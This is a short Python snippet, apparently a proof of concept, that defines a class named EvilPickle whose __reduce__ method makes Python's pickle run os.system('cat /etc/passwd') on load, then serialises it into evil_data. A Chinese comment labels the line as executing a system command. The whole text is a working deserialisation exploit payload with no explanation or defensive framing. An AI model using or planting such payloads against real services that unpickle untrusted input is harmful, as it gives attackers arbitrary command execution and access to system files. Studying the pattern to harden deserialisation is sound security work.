import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('cat /etc/passwd',))  # 执行系统命令

evil_data = pickle.dumps(EvilPickle())